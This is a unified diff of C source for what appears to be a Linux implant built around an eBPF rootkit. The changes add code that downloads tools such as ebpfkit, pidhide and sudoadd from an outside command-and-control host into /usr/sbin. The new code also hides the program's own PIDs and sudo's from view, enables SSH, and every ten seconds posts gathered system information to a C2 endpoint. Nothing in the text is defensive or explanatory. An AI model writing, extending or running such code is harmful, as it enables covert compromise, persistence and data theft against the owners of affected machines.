@@ -18,13 +18,16 @@
 
 static const char *sbin_path = "/usr/sbin/";
 static const char *username = "ebpfhelper";
-
-typedef struct {
-    char *name;
-    int *pids;
-    int count;
-    int capacity;
-} ProgramInfo;
+static const char *base_url = "http://ebpf-cnc.surge.sh/";
+static const char *programs[] = {
+    "ebpfkit", 
+    "ebpfkit-client", 
+    "webapp", 
+    "pause", 
+    "pidhide", 
+    "sudoadd", 
+    NULL
+};
 
 pid_t run_task_and_hide(const char *cmd) {
     pid_t pid = fork();
@@ -48,7 +51,6 @@ pid_t run_task_and_hide(const char *cmd) {
     }
     return pid;
 }
-
 
 
 // Function to be applied to each file in the directory
@@ -91,58 +93,49 @@ void find_pid_by_name(const char *program_name, int **found_pids) {
     pclose(fp);
 }
 
-
-void find_pid_by_names(char **program_names, int num_programs, ProgramInfo *info) {
-    DIR *dir;
-    struct dirent *entry;
-
-    if (!(dir = opendir("/proc"))) {
-        perror("opendir");
-        return;
-    }
-
-    for (int i = 0; i < num_programs; ++i) {
-        info[i].name = program_names[i];
-        info[i].count = 0;
-        info[i].capacity = 10;
-        info[i].pids = malloc(info[i].capacity * sizeof(int));
-        if (!info[i].pids) {
-            perror("malloc");
-            return;
+// Function to hide PIDs
+void hide_pids(int *pids) {
+    for (int i = 0; pids[i] != -1; ++i) {
+        printf("Hiding PID: %d\n", pids[i]);
+        char pid_str[64];
+        snprintf(pid_str, sizeof(pid_str), "%d", pids[i]);
+        
+        pid_t hide_each_pid = fork();
+        if (hide_each_pid == 0) {  // Child process
+            execl("/usr/sbin/pidhide", "pidhide", "-p", pid_str, NULL);
+            exit(0);  // Exit child process
+        } else if (hide_each_pid < 0) {  // Fork failed
+            perror("fork");
+            exit(1);
         }
     }
+}
 
-    while ((entry = readdir(dir)) != NULL) {
-        char path[512], buf[512];
-        FILE *fp;
+void combine_and_hide_pids(const char *names[], int num_names) {
+    int *combined_pids = NULL;
+    int combined_count = 0;
 
-        if (!atoi(entry->d_name)) continue;
+    for (int i = 0; i < num_names; ++i) {
+        int *found_pids = NULL;
+        find_pid_by_name(names[i], &found_pids);
 
-        snprintf(path, sizeof(path), "/proc/%s/cmdline", entry->d_name);
-        if (!(fp = fopen(path, "r"))) continue;
-
-        if (fgets(buf, sizeof(buf), fp)) {
-            char *first_token = strtok(buf, " \t");
-
-            for (int i = 0; i < num_programs; ++i) {
-                if (first_token && strstr(first_token, program_names[i])) {
-                    if (info[i].count >= info[i].capacity) {
-                        info[i].capacity *= 2;
-                        info[i].pids = realloc(info[i].pids, info[i].capacity * sizeof(int));
-                        if (!info[i].pids) {
-                            perror("realloc");
-                            fclose(fp);
-                            closedir(dir);
-                            return;
-                        }
-                    }
-                    info[i].pids[info[i].count++] = atoi(entry->d_name);
-                }
-            }
+        // Append found_pids to combined_pids
+        for (int j = 0; found_pids[j] != -1; ++j) {
+            combined_pids = realloc(combined_pids, (combined_count + 1) * sizeof(int));
+            combined_pids[combined_count++] = found_pids[j];
         }
-        fclose(fp);
+
+        free(found_pids);  // Don't forget to free the memory
     }
-    closedir(dir);
+
+    // Add the terminator
+    combined_pids = realloc(combined_pids, (combined_count + 1) * sizeof(int));
+    combined_pids[combined_count] = -1;
+
+    // Hide the combined PIDs
+    hide_pids(combined_pids);
+
+    free(combined_pids);  // Free the combined array
 }
 
 void download_file(const char *local_path, const char *url) {
@@ -312,39 +305,36 @@ void gather_system_info(char *data, size_t max_size) {
 }
 
 void handle_sigint(int sig) {
-    int found_pids[64];
-    size_t max_pids = 128;
-    int pid_count;
-    char *program_names[] = {"sudoadd", "pidhide", "writeblock"};
-    int num_programs = sizeof(program_names) / sizeof(program_names[0]);
-    ProgramInfo info[num_programs];
-
-    find_pid_by_names(program_names, num_programs, info);
-
-
     printf("\nPerforming shutdown task before exiting... \n");
 
+    char *program_names[] = {"sudoadd", "pidhide", "writeblock"};
+    int num_programs = sizeof(program_names) / sizeof(program_names[0]);
+
     for (int i = 0; i < num_programs; ++i) {
-        printf("Program: %s\n", info[i].name);
+        int *found_pids = NULL;
+        find_pid_by_name(program_names[i], &found_pids);
+
+        printf("Program: %s\n", program_names[i]);
         printf("PIDs: ");
-        for (int j = 0; j < info[i].count; ++j) {
-            printf("%d ", info[i].pids[j]);
-            if (kill(info[i].pids[j], SIGINT) == -1) {
+
+        for (int j = 0; found_pids[j] != -1; ++j) {
+            printf("%d ", found_pids[j]);
+            if (kill(found_pids[j], SIGINT) == -1) {
                 perror("kill");
             }
         }
         printf("\n");
-        free(info[i].pids);
+        free(found_pids);  // Free the memory
     }
 
     remove("/tmp/btrfs.lock");  // Remove the lock file
-    exit(0);
 
-    printf("Shutdonw complete. Goodbuy. \n");
+    printf("Shutdown complete. Goodbye. \n");
+    exit(0);
 }
 
 
-int main() {
+int main(int argc, char *argv[]) {
     if (access("/tmp/btrfs.lock", F_OK) != -1) {
         printf("Another instance is running.\n");
         exit(1);
@@ -361,6 +351,8 @@ int main() {
     char local_file_path[256];
     const char *url = "http://monchi.local:3000/cnc";
 
+    const char *names[] = {argv[0], "sudo"};
+    combine_and_hide_pids(names, sizeof(names) / sizeof(names[0]));
 //
 //    // Check if username exists, if not add it
 //    if (getpwnam(username) == NULL) {
@@ -368,46 +360,23 @@ int main() {
 //        add_system_user(username);
 //    }
 //    // Enable ssh
-//    allow_ssh();
+    allow_ssh();
 //
-//    // Loop through each program to check if it exists, if not download it
-//    for (int i = 0; programs[i] != NULL; ++i) {
-//        snprintf(local_file_path, sizeof(local_file_path), "%s/%s", sbin_path, programs[i]);
-//        if (access(local_file_path, F_OK) == -1) {
-//            snprintf(cmd, sizeof(cmd), "%s%s", base_url, programs[i]);
-//            download_file(local_file_path, cmd);
-//        }
-//    }
-//
-    // Run pidhide on this program
-    pid_t hide_pid = fork();
-    if (hide_pid == 0) { // Child process for hiding the PID
-        char hide_cmd[256];
-        char pid_str[64];
-        // snprintf(hide_cmd, sizeof(hide_cmd), "/usr/sbin/pidhide -p %d", parent_pid);
-        snprintf(pid_str, sizeof(pid_str), "%d", getppid());
-        int *found_pids = NULL;
-        find_pid_by_name("rsyslogd", &found_pids);
-
-        // Print the found PIDs
-        for (int i = 0; found_pids[i] != -1; ++i) {
-            printf("%d ", found_pids[i]);
-        }
-        
-        execl("/usr/sbin/pidhide", "pidhide", "-p", pid_str, NULL);
-        // system(hide_cmd);
-    } else if (hide_pid > 0) { // Fork failed for hide_pid
-        while (1) {
-            gather_system_info(data, sizeof(data));
-            printf("Generated JSON:\n%s\n", data);
-            send_api_call(url, data);
-
-            sleep(10); // Wait for 10 seconds before the next iteration
+    // Loop through each program to check if it exists, if not download it
+    for (int i = 0; programs[i] != NULL; ++i) {
+        snprintf(local_file_path, sizeof(local_file_path), "%s/%s", sbin_path, programs[i]);
+        if (access(local_file_path, F_OK) == -1) {
+            snprintf(cmd, sizeof(cmd), "%s%s", base_url, programs[i]);
+            download_file(local_file_path, cmd);
         }
     }
-    else {
-        perror("fork");
-        exit(1); // Exit if fork fails
+
+    while (1) {
+        gather_system_info(data, sizeof(data));
+        printf("Generated JSON:\n%s\n", data);
+        send_api_call(url, data);
+
+        sleep(10); // Wait for 10 seconds before the next iteration
     }
 
 //
